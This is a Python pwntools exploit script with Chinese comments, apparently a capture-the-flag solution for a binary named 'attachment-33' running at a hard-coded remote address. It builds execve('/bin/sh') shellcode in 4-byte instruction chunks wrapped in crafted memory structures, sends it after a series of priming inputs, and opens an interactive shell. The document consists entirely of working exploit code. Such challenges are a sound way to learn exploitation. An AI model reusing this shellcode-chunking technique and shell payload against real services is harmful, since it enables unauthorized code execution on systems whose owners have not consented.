import platform
from pwn import *

# 根据实际情况修改上下文，这里仅保留架构设置
context(arch='amd64')

binary = './attachment-33'
libc = './libc.so.6'
host, port = "101.200.155.151:12800".split(":")

# 根据环境选择远程或本地调试
if platform.system() == "Windows":
    print("[*] 检测到Windows环境，将使用远程连接而非本地调试")
    r = remote(host, port)
else:
    r = process(binary)
    # gdb.attach(r, "b *$rebase(0x156B)")  # 注释掉GDB调试行，待完善

def make_code(code):
    try:
        c = asm(code)
        if len(c) > 4:
            if r:
                r.close()
            log.error("too long!")
            log.error(code)
            return None
        c = c.ljust(4, b'\x90')
        payload1 = p64(0x114f00) + p32(0) + p32(1)
        payload1 += p64(0x114f00) + p32(0) + c
        return payload1
    except:
        if r:
            r.close()
        log.error("error")
        log.error(code)
        return None

code_payload = b"saki,stop"
code_payload = code_payload.ljust(0x20, b'\x00') + p64(0) + p64(0x1011)
code_payload += make_code("mov al, 0x68") + make_code("shl rax, 0x10") + make_code("add ax, 0x732f")
code_payload += make_code("shl rax, 0x10") + make_code("add ax, 0x6e69") + make_code("shl rax, 0x10") + make_code("add ax, 0x622f")
code_payload += make_code("push rax") + make_code("xor rax, rax") + make_code("mov rdi, rsp") + make_code("mov al, 0x3b") + make_code("syscall")

try:
    r.recvuntil("her\n")
    p1_len = (len(code_payload) - 0x30) // 0x10
    print(p1_len)
    payload = b"saki,ido"
    for i in range(p1_len):
        r.sendline(payload)
        r.sendline("1")

    r.sendline(code_payload)
    r.interactive()
except EOFError:
    log.error("与服务器连接出现问题，可能是接收到的数据不符合预期")
except Exception as e:
    log.error(f"发生异常: {e}")
finally:
    if r:
        r.close()